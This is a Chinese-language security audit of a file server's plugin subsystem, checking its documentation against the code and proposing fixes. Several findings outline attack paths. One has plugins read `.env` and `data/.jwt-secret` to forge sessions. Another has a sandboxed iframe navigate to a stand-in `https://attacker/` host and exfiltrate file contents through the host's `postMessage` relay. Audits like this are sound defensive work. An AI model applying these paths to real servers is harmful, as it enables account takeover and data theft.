# 插件子系统安全审计 + SKILL/文档 ↔ 代码一致性核对

- 审计对象：`server/src/plugins/{manifest,runner,store}.js`、`server/src/routes/plugins.js`、
  `web/src/components/plugins/{plugin-frame,schema-form}.tsx`、`web/src/lib/plugin-{registry,schema,theme}.ts`、
  以及 `safety.js` / `config.js` / `auth.js` / `index.js` / `routes/fs.js` / `web/src/index.css` 中与插件相关的部分。
- 文档侧：`skill/zeroshadow-plugins-skill/SKILL.md` 与 `references/*.md`（manifest / http-api / kind-filetype /
  kind-server / kind-theme / packaging-and-debug）、`docs/插件开发.md`、`docs/mdx/content/docs/development/plugins.mdx`；
  另把 `docs/管理员指南.md`、`docs/安全设计.md`、`docs/开发者指南.md`、`docs/配置参考.md`、`docs/常见问题.md`
  中与插件相关的断言作为"内部矛盾"的旁证。
- 方法：只做静态阅读（**未启动服务、未运行浏览器**），逐条把文档断言落到 `file:line`。
- 标记：**CONFIRMED** = 代码直接可证；**SUSPECTED** = 需要运行期/浏览器验证的推断。

---

## 一、结论摘要

1. **隔离模型的真实边界**：`server` 插件是**独立子进程但不是沙箱**（同一 OS 用户、无文件系统/网络/内存限制）。
   环境变量白名单确实生效（拿不到 `SUPER_ADMIN_PASSWORD`、`JWT_SECRET`），但插件可以直接读
   `data/.jwt-secret` 与 `.env` —— 即"环境变量白名单"挡住的东西，用一次 `fs.readFileSync` 就能拿回来。
   这一点文档表述为"能读写它能碰到的任何文件"，**没有点明后果是可完全接管服务**（伪造任意成员会话 / 拿超管明文口令）。
2. **manifest 校验是这套系统里质量最高的一环**：白名单 + 严格正则 + 主题值 CSS 逃逸防护 + settings 子集校验，
   基本没有可用的注入面；只有若干"类型强制过宽"（`apiVersion: "1"`/`true` 都通过）与"非法值静默过滤"的小问题。
3. **权限模型 = 3/4 真的执行，1/4 是装饰**：`fs.read` / `fs.write` / `ui.toast` 在
   `plugin-frame.tsx` 的 `requirePerm()` 处**被强制执行**（上一轮审计 "permissions 只声明、不执行" 的 M-3 已修复）；
   但 `settings.rw` **全仓库没有任何执行点**，且 `server` 插件的 `permissions` 也完全不参与任何判断。
   另外执行点在**浏览器**，`SECURITY-REVIEW.md` 自己建议的"服务端二次校验"并未实现。
4. **最严重的一处"安全承诺失效"不在插件本身，而在总开关**：`pluginsEnabled=false` 只拦住了
   `/api/admin/plugins*` 的写操作；`GET /api/plugins/list`、`GET /api/plugins/entry/:id`、`GET /api/plugins/theme`
   三条公开路由**完全不看总开关**。于是"关掉总开关后已装插件不再生效（主题自动撤销）"这句写在
   `管理员指南`/`配置参考`/界面文案里的承诺是**假的**：插件入口照发、fileType 照渲染、主题照生效。
5. **一个本地泄露点**：`/api/plugins/list` 是**匿名**接口，却把每个 fileType 插件的 `settings` 原样下发
   （`store.js:185`）。管理员在插件设置里填的任何口令/令牌（string 型设置）对任何访客可见。
6. **`data/plugins.json` 没有被 `safety.js` 保护**（只保护了目录 `plugins`），而文档两处明确说它"已在敏感名单里"。
   在 `FILES_DIR=项目根` 或 `FILES_SOFT_DIR` 映射项目根（`.env` 模板里就给过 `"./"` 的示例）的部署下，
   它可以被网盘接口下载 —— 里面是插件私有设置 + sha256 + id 清单。
7. **文档↔代码漂移数量**：核对 **158 条**具体断言，**一致 126 条 / 漂移 32 条**（另有 15 条属"文档之间互相打脸"，
   单列在第四节；32 条漂移里约 7 条是"文档描述的功能根本没接线"，6 条是"文档写的行为与代码**相反**"）。最值得修的是：总开关不生效、
   `data/plugins.json` 敏感名单、崩溃返回码 502→500、`init.settings` 恒 `{}`、`init.file.size/mtime` 恒 0、
   `modes:["edit"]` 从未被消费、`fileType` 权限在 mdx 里仍写作"将来"。

---

## 二、插件安全发现（按严重度）

### 高

#### S-1（H）`server` 插件可读 `.env` / `data/.jwt-secret` / `users.json` / `data/plugins.json` —— 即完全接管服务 · CONFIRMED

- 启动方式（这是**全部**的隔离手段）：
  ```js
  // server/src/plugins/runner.js:102-107
  const proc = spawn(process.execPath, [entryAbs], {
    cwd: path.join(PLUGIN_DIR, id),
    env: childEnv(id),
    stdio: ["pipe", "pipe", "pipe"],
    windowsHide: true,
  })
  ```
  **没有** `--max-old-space-size`、没有 `ulimit`/Job Object/cgroup、没有 `--permission`/`--experimental-permission`、
  没有 `seccomp`、没有网络命名空间。`cwd` 只是工作目录，不是限制：`path.resolve(process.cwd(), "../../../.env")`
  就得到 `<ROOT>/.env`（`DATA_DIR = path.join(ROOT_DIR,"data")`，`server/src/env.js:158`）。
- 可读的三个目标（均无任何机制阻止）：
  - `<ROOT>/.env` → `SUPER_ADMIN_PASSWORD` 明文（`env.js:8, 29-31`）；
  - `data/.jwt-secret` → 会话签名密钥（`env.js:202-219`），拿到即可签发**任意成员**会话（`auth.js:47-53`
    的 member 载荷只需要 `uid` + `tokenVersion`，而 `uid`/`tokenVersion` 就在 `users.json` 里）；
  - `data/users.json`（bcrypt 哈希）、`data/plugins.json`（插件私有设置）。
- 环境变量白名单本身**是对的**（`runner.js:44-51`，只给 `PATH/Path/SystemRoot/TEMP/TMP/TMPDIR/LANG/LC_ALL`
  + `ZS_PLUGIN*`），所以文档"拿不到 `JWT_SECRET`"这半句成立；但**这半句给了错误的安全感** ——
  文件系统没有任何收敛：
  ```js
  // server/src/plugins/runner.js:44-51
  const allow = ["PATH", "Path", "SystemRoot", "TEMP", "TMP", "TMPDIR", "LANG", "LC_ALL"]
  const env = { ZS_PLUGIN: "1", ZS_PLUGIN_ID: id, ZS_PLUGIN_API_VERSION: "1" }
  ```
- 文档口径：`runner.js:14-21` 与 `kind-server.md:6-8`、`插件开发.md:224-228` 都诚实写了"不是沙箱"。
  **但风险被低估**：文档只说"能读写它能碰到的任何文件"，没有说"读到 `.jwt-secret` 等于拿到全部账号"。
  建议在文档与安装确认框里直接写明这一点。
- 另一个部署级后果（**CONFIRMED，静态推理**）：`spawn(process.execPath, ...)` 在 `pkg` 打包后
  `process.execPath` 是 `ZeroShadow.exe` 本身（`env.js:5` 正是靠 `process.pkg` 判断打包态），
  于是子进程会变成"再启动一个网盘服务"，永远不会发 `ready` → 必然 504 启动超时。
  这意味着**发布版里 server 插件实际不可用**，与 `插件开发.md:361` "`pkg` 打出的单文件 exe 与源码运行行为一致" 相反。

#### S-2（H）总开关 `pluginsEnabled` 不阻断运行时 —— 与文档"关闭后已装插件不再生效"直接相反 · CONFIRMED

```js
// server/src/routes/plugins.js:104-112 —— 只有 admin 路由挂了总开关检查
adminPluginRouter.use(requireRole("superadmin"))
function ensurePluginsEnabled() {
  if (getConfig().pluginsEnabled !== true) {
    throw httpError(403, "插件功能已关闭（默认关闭，请在「设置 → 插件」中开启）", {
```
- 三条公开路由（`routes/plugins.js:38-43` `/theme`、`:53-56` `/list`、`:69-96` `/entry/:id`）**没有任何
  `pluginsEnabled` 判断**；`store.js:149-155`（`activeThemeManifest`）、`store.js:167-189`（`enabledRuntimePlugins`）
  也没有（`store.js` 根本没 import `config.js`）。
- 后果：开关关闭期间，`GET /api/plugins/entry/<id>` 仍返回插件 HTML（且仍带 sandbox CSP）、
  `/api/plugins/list` 仍把插件交给预览页渲染、`/api/plugins/theme` 仍返回主题 CSS。
- 与文档冲突：
  - `docs/管理员指南.md:613` "已装插件不再生效（主题自动撤销）"；
  - `docs/配置参考.md:283` "已装插件也不再生效"；
  - 前端文案 `web/src/locales/zh/plugins.json` `"ui.plugins.enable_hint"` "关闭后已装插件不再生效（文件保留）"。
  实际上 `plugins-section.tsx:63` 关开关后调 `loadPluginTheme()` 想撤销主题，但该函数拉的
  `/api/plugins/theme` 依旧返回旧主题，于是**主题被原样重新套上**，刷新后也照旧。
- 修法（供参考）：在 `activeThemeManifest()` / `enabledRuntimePlugins()` / `pluginEntryFile()` 里统一
  `if (getConfig().pluginsEnabled !== true) return null/[]`，即"运行时三入口一处收口"。

#### S-3（H/M）`fileType` iframe 可以"自导航"到外部页面，从而绕开 `connect-src 'none'` 把文件内容外发 · SUSPECTED

- 插件文档确实是"自包含 + 零网络"的设计（`routes/plugins.js:74-88` CSP，`plugin-frame.tsx:190-199` iframe 属性）。
  两层防线都在：
  ```tsx
  // web/src/components/plugins/plugin-frame.tsx:195
  sandbox="allow-scripts"
  ```
  ```js
  // server/src/routes/plugins.js:78-88
  "default-src 'none'", "script-src 'unsafe-inline'", "style-src 'unsafe-inline'",
  "img-src data: blob:", "connect-src 'none'", "base-uri 'none'",
  "form-action 'none'", "sandbox allow-scripts",
  ```
  但 CSP 与 `sandbox` **都不阻止一个 frame 导航它自己**（只有 `allow-top-navigation` 管父窗口；
  `form-action` 只管表单；`navigate-to` 已从规范移除）。而 `fileType` 插件本来就是任意的内联 JS。
- 一旦 `location = "https://attacker/"`：
  1. `iframe.contentWindow` 这个 **WindowProxy 不变**，所以宿主
     `plugin-frame.tsx:141` 的 `event.source !== frame.contentWindow` **仍然通过**；
  2. 新文档带来自己的响应头/CSP，**旧文档的 `connect-src 'none'` 不再适用** → 可以任意 `fetch`；
  3. 新文档发一个 `{type:"zs:ready"}` 就能拿到 `zs:init`（`plugin-frame.tsx:145-155`，含 `file.path`、
     `plugin.settings`、`canWrite`），随后发 `zs:request` 触发宿主代读文件，
     而宿主回包用的是 `postMessage(..., "*")`：
     ```ts
     // web/src/components/plugins/plugin-frame.tsx:74
     if (win) win.postMessage(message, "*", transfer ?? [])
     ```
     → 读到的正文直接落进外部页面手里。
- 影响面：**不突破 `permissions`**（`requirePerm` 仍按清单判断，见 S-5），但**突破了"插件内容出不了浏览器"
  这一条文档承诺**（`SKILL.md:110`、`kind-filetype.md:56`、`安全设计.md:446` "发不出任何请求"）。
  也就是说：一个只声明 `fs.read` 的插件本来"能读但不能外传"，加上这一步就变成"能读且能外传"。
- 需要浏览器验证的点：`event.origin` 在两种情况下都是字符串 `"null"`（不透明源），所以**不能靠校验 origin 修**；
  可行方向是 `frame.contentWindow.location` 不可读（跨源）时用"每次 init 后校验一次 `zs:ready` 计数 +
  禁止导航（`Content-Security-Policy: sandbox allow-scripts` 无法禁）+ 监听 `iframe` 的 `load` 事件计数"，
  或改成 `blob:`/`data:` 承载文档并只在首次 load 后发 init。**这是设计层问题，不是一行补丁。**

#### S-4（H/M）匿名接口 `GET /api/plugins/list` 泄漏插件私有设置 · CONFIRMED

```js
// server/src/plugins/store.js:174-186
out.push({
  id: manifest.id, name: manifest.name, version: manifest.version, kind: manifest.kind,
  extensions: manifest.extensions, modes: manifest.modes,
  permissions: manifest.permissions,
  // 插件自己的设置：由管理员在后台填，最终交给插件渲染时使用。
  // 它属于"插件配置"而不是"网盘机密"，且拼好后的内容本来就会展示给用户。
  settings: st.settings || {},
})
```
- 挂载点没有任何鉴权：`index.js:140` `app.use("/api/plugins", publicPluginRouter)`，`routes/plugins.js:53-56`
  直接 `res.json({ plugins: enabledRuntimePlugins() })`。匿名访客一条 `curl` 就能拿到所有已启用
  fileType 插件的全部 string 设置值。
- 代码注释用"不是机密"来正当化，但 settings 的 schema 只支持 `string`（`manifest.js:138-145`），
  插件作者把 API Key / 对象存储凭据填进 string 设置是完全自然的用法。
- 建议：`/list` 只下发 `id/name/version/kind/extensions/modes/permissions`，`settings` 改为随
  `zs:init` 走一条**已鉴权**的按插件取设置的接口（`routes/plugins.js:99-101` 的 `pluginRuntimeSettings`
  已经写好了却从未被挂到任何路由上，见 S-11）。

#### S-5（H/M）`data/plugins.json` 未纳入 `safety.js` 敏感名单 · CONFIRMED（与 3 处文档相反）

```js
// server/src/safety.js:143-163
const SENSITIVE_DATA_ENTRIES = new Set([
  ".jwt-secret", "config.json", "users.json", "groups.json", "todos.json", "shares.json",
  "backups", "logs", "metrics", "tmp", "trash", "avatars", "lang", "thumbs",
  "plugins",        // ← 只有目录名，没有 "plugins.json"
])
// 判定：按 data/ 之后的第一段名字匹配
// server/src/safety.js:213-216
if (!norm.startsWith(dataNorm + path.sep)) return false
const firstRaw = norm.slice(dataNorm.length + 1).split(path.sep)[0]
return SENSITIVE_DATA_ENTRIES.has(first)
```
`data/plugins.json` 的第一段是 `plugins.json` ∉ 集合 → **`isSensitiveAbs` 返回 false**，即
`resolveAny()` / WebDAV / zip 打包 / 下载全部放行。触发条件不是默认布局，而是：
- `FILES_DIR` 指向项目根（含 `data/`），或
- `FILES_SOFT_DIR` 映射项目根 —— 而 `env.js:42-48` 的 `.env` 模板里就写着 `# FILES_SOFT_DIR={"软件文件夹":"D:/MyFiles", ...}`
  这种"映射任意目录"的用法，注释里甚至出现过 `"./"` 的示例（`safety.js:113-115` 也承认这个历史）。

文档断言（**全部与代码不符**）：
- `references/packaging-and-debug.md:93` "`data/plugins/` 与 `data/plugins.json` 都在 `safety.js` 的敏感名单里"；
- `docs/开发者指南.md:652` "两处都加入了 `safety.js` 敏感条目"；
- 推荐修法：把 `"plugins.json"` 加入集合（一行），或改成"`*.json` 一律视为服务数据"。

### 中

#### S-6（M）权限只落实了 3/4：`settings.rw` 全仓库无执行点；`server` 插件的 `permissions` 完全不参与判断 · CONFIRMED

逐条列出每个权限名与它的**唯一**检查位置：

| 权限 | 声明白名单 | 运行期检查点 | 结论 |
|---|---|---|---|
| `fs.read` | `manifest.js:26` | `plugin-frame.tsx:93`（`readText`）、`:99`（`readBinary`） | 执行 ✅ |
| `fs.write` | `manifest.js:27` | `plugin-frame.tsx:111`（`saveText`，另加 `canWrite` + 服务端 `requirePerm("editFiles")` `routes/fs.js:1532`） | 执行 ✅ |
| `ui.toast` | `manifest.js:28` | `plugin-frame.tsx:126`（`notify`） | 执行 ✅ |
| `settings.rw` | `manifest.js:29` | **无**（`grep settings\.rw` 只命中白名单与 6 处文档/注释） | **只声明 ❌** |

```ts
// web/src/components/plugins/plugin-frame.tsx:85-90  —— 唯一执法点
const perms = Array.isArray(plugin.permissions) ? plugin.permissions : []
const requirePerm = (perm: string) => {
  if (!perms.includes(perm)) throw new Error(t("ui.preview.plugin_permission_denied", { perm }))
}
```
- `settings.rw` 想表达"读写自己的设置"，但实际机制是：管理员在后台填（`schema-form.tsx` + `savePluginSettings`），
  插件通过 `zs:init` 的 `settings` 字段**无条件**收到（`plugin-frame.tsx:150`）—— 与是否声明 `settings.rw` 无关。
- `server` 插件的 `permissions` 同样不参与任何判断（`routes/plugins.js:210-233` 只查 `kind/enabled/actions`），
  而 SKILL.md 的标题直接写"权限（**会被强制执行**）"（`SKILL.md:89`），容易被读成对三种 kind 都成立。
- 结论对上一轮审计的回应：**"permissions 只声明、不执行"已部分修复**（`SECURITY-REVIEW.md:16` 的 M-3 标注为已修，
  与代码相符），但**仍有 1 个权限是纯装饰**，且执法点在客户端。

#### S-7（M）权限执法在浏览器、且是"每次调用现查"，服务端零校验 —— 与自家审计建议相悖 · CONFIRMED

- `SECURITY-REVIEW.md:175` 的建议 2："更彻底：宿主把请求转成一次服务端调用，由服务端按'插件 id + 动作'再校验一次
  （前端校验只是体验，不是边界）" —— **未实现**。当前 `/api/fs/file`、`/api/fs/save-file` 完全不知道"这是插件在调"，
  只看用户权限。
- 现实风险有限（iframe 是不透明源，插件改不了宿主 JS），但意味着：
  ① 任何前端回归（例如有人把 `requirePerm` 挪走、或 `plugin.permissions` 取错来源）**直接变成越权**；
  ② 权限与"插件负责的后缀"无关 —— 一个只负责 `.foo` 的插件可以读用户可见的**任意**路径
     （`plugin-frame.tsx:80` `targetPath` 完全由插件指定，这是设计如此，但文档没提醒）。
- 另：`plugin.permissions` 的来源是 S-4 那个匿名 `/list`；一旦该接口被中间层改写，权限判定跟着变。

#### S-8（M）`server` 插件崩溃/被超时杀掉时，在途请求返回 **500**，而文档写 502 `process_gone` · CONFIRMED

```js
// server/src/plugins/runner.js:60-66
function rejectAll(inst, message) {
  for (const [, pending] of inst.pending) { clearTimeout(pending.timer); pending.reject(new Error(message)) }
  inst.pending.clear()
}
// runner.js:171-175
proc.on("exit", (code) => { if (running.get(id) === inst) kill(inst, `插件进程退出（code=${code}）`) })
```
`new Error(...)` 没有 `status` → `index.js:214-237` 的错误中间件按 500 处理，body 变成
`{error:"服务器内部错误", errorKey:"api.common.server_error"}`，**插件相关的 errorKey 全部丢失**。
文档断言（**不一致**）：`references/kind-server.md:64` "进程崩溃/退出 → 所有在途动作 `502 api.plugins.process_gone`"、
`http-api.md:168`、`插件开发.md:294`。
502 `process_gone` 只在 `runner.js:219-221`（调用前进程已不可用）出现。
修法：`rejectAll` 里改成 `httpError(502, ..., { errorKey: "api.plugins.process_gone" })`。

#### S-9（M）DoS 面：无内存/CPU 上限、无重启退避、`pending` 无并发上限、stdin 无背压 · CONFIRMED

- 资源上限：**只有时间**（`ACTION_TIMEOUT_MS=5000` / `MAX=30000` / `READY_TIMEOUT_MS=10000` / `IDLE_STOP_MS=60000`，
  `runner.js:32-41`）。内存炸弹会拖垮整机（无 `--max-old-space-size`、无 Job Object），
  与 `插件开发.md:231` "内存爆炸不把主进程带走"的表述不符 —— 主**进程**确实不会被带崩，但**机器**会。
- 重启风暴：`start()` 只要 `running` 里没有就 spawn（`runner.js:86-88`），插件"启动即崩"时每次
  `POST /:id/action` 都会 spawn 一个新进程（无失败计数/退避/熔断）。该端点无 `rateLimit`
  （对比 `routes/fs.js` 的读写在 `:1467`/`:1532` 都挂了 `rateLimit`），但只有超管能触发 → 实际为"管理员误触放大"。
- `inst.pending` 是无界 `Map`（`runner.js:114, 232`），并发动作数不设限；`proc.stdin.write` 无背压处理。
- `proc.stdin` 没有 `error` 监听（只有 `proc.on("error")`，`runner.js:176`）：子进程先死、后写 → 流上抛
  `EPIPE` 未捕获 → 落到 `index.js:312` 的 `uncaughtException` 兜底（进程不退出，但日志会被刷）。
- 公开面：`/api/plugins/entry/:id` 无速率限制，每次最多 2 MB（`MAX_PACKAGE_BYTES`）→ 带宽放大。

#### S-10（M）`MAX_LINE_BYTES` 在"解析前"按累积缓冲判定 —— 合法插件也会被杀；且按字符不按字节 · CONFIRMED

```js
// server/src/plugins/runner.js:139-144
proc.stdout.on("data", (chunk) => {
  inst.buffer += chunk
  if (inst.buffer.length > MAX_LINE_BYTES) { kill(inst, "插件输出超长（疑似死循环打印）"); return }
  let index
  while ((index = inst.buffer.indexOf("\n")) >= 0) { ... }
```
判定发生在**拆行之前**，所以：
- 一次 `action` 返回 >256 KB 的**单行合法 JSON** → 进程被杀；
- 插件在极短时间内连续 flush 多行（累计 >256 KB 的 chunk）→ 也被杀，尽管每一行都完整可解析；
- `setEncoding("utf8")` 后 `.length` 是**字符数**，实际字节上限可达 ~768 KB。

文档 `kind-server.md:55-56` 写的是"累积超过 256 KB **未换行**会直接杀进程" —— 与代码行为不符（见核对表）。

#### S-11（M）安装/上传路径的其余结论（多数为"已做对"，一处死代码）

| 检查项 | 结论 |
|---|---|
| zip-slip | **已防**。`safeRelPath` 拒绝 `..`/`/` 开头/绝对路径（`store.js:212-217`），逐条自己写而不 `unzipper.Extract`（`store.js:225-258`），落盘前还按 `buffer.length` 复核（`store.js:253`） |
| 符号链接 | 代码写了 `if (entry.type !== "File" && entry.type !== "Directory") continue`（`store.js:233`），但 unzipper 0.12.5 只会产出 `Directory`/`File`（`lib/Open/directory.js:223`），符号链接条目被当普通文件写入一个"内容=链接目标"的文本文件 —— 不影响安全，但文档"符号链接直接不写"的说法不准确 |
| 包体积/条目 | 2 MB / 10 MB / 300 条 / 20 个插件，与文档完全一致（`store.js:32-38`） |
| 签名/哈希校验 | **没有**。`hashDirectory()` 只在安装后算一次存进 `plugins.json`（`store.js:329-332`），运行期不校验；文档 `http-api.md:87` 也承认"不参与运行期校验" |
| 设置服务端校验 | **已做**（`store.js:403-445`）：枚举/`maxLength`/`minimum`/`maximum`/`integer` 逐项校验，只保留 schema 里的键 |
| 死代码 | `runtimeSettings()`（`store.js:202-204`）+ `pluginRuntimeSettings()`（`routes/plugins.js:99-101`）**从未被任何路由挂载**；`runner.js:181` 把 `settings` 硬编码成 `{}`。这正是 S-4 的正确修法所需要的零件，已存在但没接线 |

#### S-12（M）主题"只有 light 令牌时暗色模式保持默认"是**错的**（特异性 0,1,1 > 0,1,0） · CONFIRMED

- 生成器：`manifest.js:299-317`，浅色块选择器 `html[data-theme-plugin="<id>"]{…}`（`:302`），暗色块
  `html[data-theme-plugin="<id>"].dark{…}`（`:311`）。
- 应用侧 `.dark` 挂在 `<html>` 上（`web/src/components/theme-provider.tsx:106,113-114`
  `const root = document.documentElement; root.classList.add(resolvedTheme)`），所以暗色块**能命中**。
- 但浅色块的特异性是 **(0,1,1)**，而 `web/src/index.css:105` 的 `.dark` 是 **(0,1,0)** ——
  所以只声明了 `light` 的主题，在暗色模式下浅色值**照样覆盖** `--background` 等，
  而不会"保持默认"。`kind-theme.md:36` 的"只有 `light` 也可以，但暗色模式下会保持默认"与
  `kind-theme.md:94-95` 自己的特异性论证**互相矛盾**。
- 附带小 bug：`normalizeTheme` 允许 `light` 或 `dark` 之一为空（`manifest.js:165`），
  而 `block()` 的前置判断是 `body || extra ? … : ""`（`:307`）—— 当某一侧为空时会生成
  `html[data-theme-plugin="x"].dark{;.dark}` 这种非法 CSS 声明。浏览器会丢弃，无安全影响，但属实现瑕疵。

### 低

- **S-13** `apiVersion` / `kind` / `permissions` 的类型强制过宽：`const apiVersion = Number(raw.apiVersion)`
  （`manifest.js:196`）→ `"1"`、`true`、`1.0` 全部通过；`permissions` 非数组时静默当 `[]`
  （`:209`）→ `permissions: "fs.read"` 装上后等于零权限；`permissions` 还有一条**未文档化**的上限 =
  `PLUGIN_PERMISSIONS.size`（4 项，`:210`），因此 `["fs.read","fs.read","fs.read","fs.read","fs.read"]`
  会被"permissions 过多"拒掉（尽管去重后只有 1 项）。CONFIRMED
- **S-14** `extensions` / `modes` 的非法值被**静默过滤**而不是拒绝（`manifest.js:244-251`）：
  `extensions: ["foo.txt"]` → `[]` → 报"必须声明 extensions"（信息误导）；`modes: ["bogus"]` → 静默变
  `["preview"]`。与整个文件反复强调的"宁可装不上也不静默忽略"原则不一致。CONFIRMED
- **S-15** `runner.start()` 重新从磁盘读 `manifest.json` 时**不再过 `normalizeManifest`**，
  直接 `path.join(PLUGIN_DIR, id, ...String(manifest.entry || "").split("/"))`（`runner.js:90-100`）。
  当前被路由层的 `row.broken` 检查间接保护（`routes/plugins.js:217`），但存在 TOCTOU：
  清单在 `listPlugins()` 与 `start()` 之间被改写（server 插件本身可写自己的目录）时，
  `entry` 可指向插件目录之外。SUSPECTED，低。
- **S-16** `readBinary` 的 16 MB 上限在 `arrayBuffer()` **之后**才判断
  （`plugin-frame.tsx:105-107`）→ 大文件会先被完整读进内存。CONFIRMED（低）。
- **S-17** i18n 缺键：`ui.preview.plugin_permission_denied` 只有 `zh` / `en` 有
  （`web/src/locales/zh/plugin-preview.json:8`、`en/` 同），`zh-TW` / `zh-HK` / `ja` / `fr` / `es`
  缺失 → 这几种语言下"权限被拒"提示会显示原始键名。CONFIRMED。
- **S-18** `invalidateRuntimePlugins()`（`plugin-registry.ts:53-55`）注释说"设置页启停插件后调用"，
  **实际无人调用**（`grep` 只命中定义）→ 启用插件后必须刷新页面才能预览。CONFIRMED。
- **S-19** `plugins-section.tsx:35-36` 顶部注释仍写"这一轮只启用 `kind: theme`"，与实现（三种都可运行）不符 —— 纯注释漂移。

### 已核验为"安全"的点（避免下一轮重复劳动）

1. **主题令牌不可逃出 CSS 上下文**：名字 `^--[a-zA-Z0-9-]{1,40}$`（`manifest.js:52`），
   值禁 `;{}@<>\\`、换行与 `url(`/`expression(`/`javascript:`（`:54`），长度 ≤200（`:55`）；
   注入侧用 `styleEl.textContent = css`（`plugin-theme.ts:34`）而**不是** `innerHTML`；
   未闭合的 `(` 只会污染插件自己那段 `<style>`（独立样式表，不会影响外壳 CSS）。
   `url()`/`@import` 被禁 → 拿不到访问者 IP。即使 `id` 也做了二次净化（`manifest.js:301`）。
2. **插件不会被当作前端模块打包**：`fileType` 只有 HTML，`web/` 里没有任何代码从 `data/plugins/` 或包内
   import 组件；插件拿不到 app 权限（无 TSX 执行、无共享 React 上下文）。
3. **`event.origin` 处理是对的**：只认 `event.source === frame.contentWindow`（`plugin-frame.tsx:141`），
   并明确注释了不透明源下 origin 恒为 `"null"`（`:32-33`）—— 这是很多实现会写错的地方。
4. **双层沙箱**：iframe `sandbox="allow-scripts"` **无** `allow-same-origin`（`:195`）
   + 响应 CSP 里的 `sandbox allow-scripts`（`routes/plugins.js:86`）+ `default-src 'none'`/`connect-src 'none'`
   + `X-Content-Type-Options: nosniff`（`:89`）。
5. **路径穿越**：入口只按 manifest 声明的 `entry` 取（`store.js:192-199`），
   `resolvePluginAsset` 再做 `path.resolve` 前缀校验（`:450-464`）；zip 解压逐条校验（`:212-258`）。
6. **manifest 未知字段直接拒绝**（`manifest.js:185-187`）、`theme` 插件零权限强制（`:217-219`）。
7. **安装/启停/卸载/动作全部 `requireRole("superadmin")`**（`routes/plugins.js:104`），且 `index.js:132`
   把 `/api/admin/plugins` 挂在 `/api/admin` **之前**（避免被通用守卫吞掉）。
8. **插件目录本身**（`data/plugins`）在 `safety.js` 敏感名单里（`safety.js:162`），网盘接口列不出/下载不了。
9. **无签名校验**这件事与文档一致（`http-api.md:87`），且威胁模型是"超管自己上传的包"，可接受。

---

## 三、SKILL 与代码核对表

> 位置列都是仓库相对路径。判定只有"一致 / 漂移"两种（漂移 = 文档与代码在字段、取值、状态码、
> 行为或语义上不符）。**共核对 158 条，一致 126 / 漂移 32**（"同一份文档内部矛盾"另见第四节 15 条）。

### 3.1 manifest.json 字段与类型（`references/manifest.md` / `SKILL.md` §manifest）

| 文档声明 | 代码实际 | 位置 | 判定 |
|---|---|---|---|
| 顶层字段白名单共 **15** 个：`id,name,version,apiVersion,kind,description,author,homepage,permissions,theme,settings,entry,extensions,modes,actions` | 集合恰好这 15 个 | `manifest.js:33-49` | 一致 |
| 未知顶层字段 → `manifest 含未知字段：xxx` 安装失败 | 逐 key 检查并抛 `ManifestError` | `manifest.js:185-187` | 一致 |
| `id` 必填、`^[a-z0-9][a-z0-9-]*(\.[a-z0-9-]+){1,5}$`、≤64、至少一个点 | 完全相同 | `manifest.js:57,189-190` | 一致 |
| `name` 必填 ≤40 / `version` 必填 ≤32 且 `x.y.z`（可带 `-prerelease`） | 一致 | `manifest.js:58,192-194` | 一致 |
| `apiVersion` **整数**，只接受 `1` | `Number(raw.apiVersion)` → `"1"`、`true`、`1.0` 也被接受 | `manifest.js:196-202` | **漂移**（类型过宽） |
| `kind` ∈ `theme`/`fileType`/`server`，大小写敏感 | 一致 | `manifest.js:22,204-207` | 一致 |
| `description` ≤300 / `author` ≤60 / `homepage` ≤200 | 一致（超长抛错而非截断） | `manifest.js:227-229` | 一致 |
| 字段值被 `trim`，空串=未提供；必填缺失 → `manifest 缺少 xxx` | 一致 | `manifest.js:69-77` | 一致 |
| `permissions` 必须是**数组**，元素 ∈ 白名单，会去重 | 非数组**静默当 `[]`**；且未文档化的长度上限 4 | `manifest.js:209-215,230` | **漂移** |
| `kind==="theme"` 时 `permissions` 必须为空 | 一致（`theme_permissions_denied`） | `manifest.js:217-219` | 一致 |
| theme：`light`/`dark` 各 ≤80 令牌，合计 ≥1 | 一致（`theme.light / theme.dark 至少要有一些令牌`） | `manifest.js:86-89,165-167` | 一致 |
| theme 令牌名 `^--[a-zA-Z0-9-]{1,40}$` | 一致 | `manifest.js:52,90` | 一致 |
| theme 令牌值 ≤200，禁 `;{}@<>\\`、换行、`url(`、`expression(`、`javascript:` | 一致（正则含 `\n\r`，`i` 标志） | `manifest.js:54-55,93-94` | 一致 |
| `fontSans` ≤120、同一套禁用字符；`noise` 布尔可选 | 一致；`noise` 存下但 `themeCss()` 从不使用（文档也说是保留字段） | `manifest.js:169-172,299-317` | 一致 |
| theme 若声明 `entry/extensions/modes/actions` **不报错也不生效** | 一致（非 theme 分支才读，字段被丢弃） | `manifest.js:234-271` | 一致 |
| fileType：`entry` 必填 ≤120、`^[A-Za-z0-9._/-]+\.html$`、不含 `..` | 一致（`entry_invalid`） | `manifest.js:240-243` | 一致 |
| fileType：`extensions` 必填非空、每项 `^[A-Za-z0-9]{1,12}$`、转小写 | 非法项被**静默过滤**（只有全空才报错） | `manifest.js:244-249` | **漂移** |
| fileType：`modes` 可省，默认 `["preview"]`，只接受 `preview`/`edit` | 非法值被静默过滤后回落 `["preview"]` | `manifest.js:250-251` | **漂移** |
| server：`entry` 必填、`.js`/`.mjs`、不含 `..` | 一致 | `manifest.js:254-257` | 一致 |
| server：`actions` 必填 1..20、`^[a-z][a-z0-9_-]{0,31}$`、去重 | 一致 | `manifest.js:258-268` | 一致 |
| server：`extensions`/`modes` 被强制清空 | 一致 | `manifest.js:269-270` | 一致 |
| settings：`type` 必须 `object`；`additionalProperties` 只能 `false`；`properties` ≤20；键 `^[a-zA-Z0-9_-]{1,32}$` | 一致 | `manifest.js:108-125` | 一致 |
| settings：属性 `type` ∈ string/number/integer/boolean；`enum` ≤30；`maxLength` 1..4000；`title`≤60/`description`≤200/`placeholder`≤60 | 数值一致 | `manifest.js:129-152` | 一致 |
| 展示字段 `title/description/placeholder`"**都只在 string 上生效**，会被截断" | 对**所有类型**都生效并截断 | `manifest.js:133-135` | **漂移**（措辞） |
| 保存设置：`boolean` 严格 `=== true`；`enum` 必须命中；数字 `Number()` 且 `NaN` → 400 | 一致 | `store.js:413-439` | 一致 |
| 保存设置：string 无 `maxLength` 时"按默认 200 **截断**" | 一致（`text.slice(0, spec.maxLength || 200)`） | `store.js:424` | 一致 |

### 3.2 apiVersion 与兼容策略

| 文档声明 | 代码实际 | 位置 | 判定 |
|---|---|---|---|
| `SUPPORTED_API_VERSIONS = {1}`，只认 1 | `new Set([1])` | `manifest.js:19` | 一致 |
